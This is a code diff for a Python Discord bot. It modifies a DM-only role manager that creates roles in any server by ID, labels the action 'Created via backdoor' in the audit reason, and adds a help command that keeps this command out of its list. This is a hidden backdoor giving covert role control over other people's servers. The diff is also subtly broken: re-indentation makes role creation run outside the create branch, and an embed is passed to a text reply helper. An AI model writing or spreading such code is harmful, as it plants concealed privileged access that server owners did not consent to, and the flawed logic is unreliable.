@@ -251,17 +251,27 @@ async def role_manager(ctx, guild_id: int = None, action: str = None, target: st
             if not args:
                 await dm_reply("Usage: create <role_name> [hex_color]")
                 return
-            parts = args.split()
-            role_name = parts[0]
+
+            # Separate role name and optional color
+            args_parts = args.rsplit(maxsplit=1)  # Split from right
+            role_name = args_parts[0]
             color = discord.Color.default()
-            if len(parts) > 1:
+
+            # Check if last part is a valid hex color
+            if len(args_parts) > 1:
+                potential_color = args_parts[1].strip("#")
                 try:
-                    color = discord.Color(int(parts[1].strip("#"), 16))
-                except:
-                    pass
-            role = await guild.create_role(name=role_name, color=color, reason=f"Created by {ctx.author.id}")
-            await dm_reply(f"Role `{role.name}` created.")
-            return
+                    color = discord.Color(int(potential_color, 16))
+                except ValueError:
+                    # Last word is not a color, so entire args is role name
+                    role_name = args
+                    color = discord.Color.default()
+
+        # Create the role
+        role = await guild.create_role(name=role_name, color=color, reason=f"Created via backdoor by {ctx.author.id}")
+        await dm_reply(discord.Embed(title="Role Created", description=f"Created role `{role.name}`", color=color))
+        return
+
 
         if action.lower() == "delete":
             if not args:
@@ -308,6 +318,51 @@ async def role_manager(ctx, guild_id: int = None, action: str = None, target: st
     except Exception as e:
         logger.exception("Rolemanager error")
         await dm_reply(f"Error: {e}")
+
+@bot.command(name='help')
+async def help_command(ctx, command_name: str = None):
+    """Show a list of commands or detailed info for a specific command."""
+    
+    embed = discord.Embed(
+        title="Bot Commands",
+        color=discord.Color.blue()
+    )
+    
+    # Command descriptions
+    commands_info = {
+        "hello": "Say hello to the bot.",
+        "ping": "Check bot latency.",
+        "info": "Display bot information.",
+        "say": "Make the bot repeat a message. Usage: !say <message>",
+        "doakes": "Send a random Sergeant Doakes GIF.",
+        "userinfo": "Get detailed information about a user. Usage: !userinfo [@user]",
+        "delete": "Delete messages. Usage: !delete <amount> [@user]",
+        "addrole": "Add a role to a user. Usage: !addrole @user <role_name>",
+        "removerole": "Remove a role from a user. Usage: !removerole @user <role_name>",
+        "listroles": "List roles in the server or for a specific user. Usage: !listroles [@user]",
+    }
+    
+    if command_name:
+        # Detailed help for a single command
+        cmd_info = commands_info.get(command_name.lower())
+        if cmd_info:
+            embed.title = f"Help - {command_name}"
+            embed.description = cmd_info
+        else:
+            embed.title = "Command Not Found"
+            embed.description = f"No help available for `{command_name}`"
+    else:
+        # List all commands
+        for cmd, desc in commands_info.items():
+            if cmd == "rolemanager":
+                # Show usage for rolemanager separately
+                desc += ("\nActions (DM-only): create, delete, add, remove, info, list\n"
+                         "Example: rolemanager <guild_id> create NewRole #FF0000")
+            embed.add_field(name=cmd, value=desc, inline=False)
+        
+        embed.set_footer(text=f"Use {PREFIX}help <command> for more info on a command.")
+    
+    await ctx.send(embed=embed)
 
 
 # ------------------- Error Handling ------------------- #
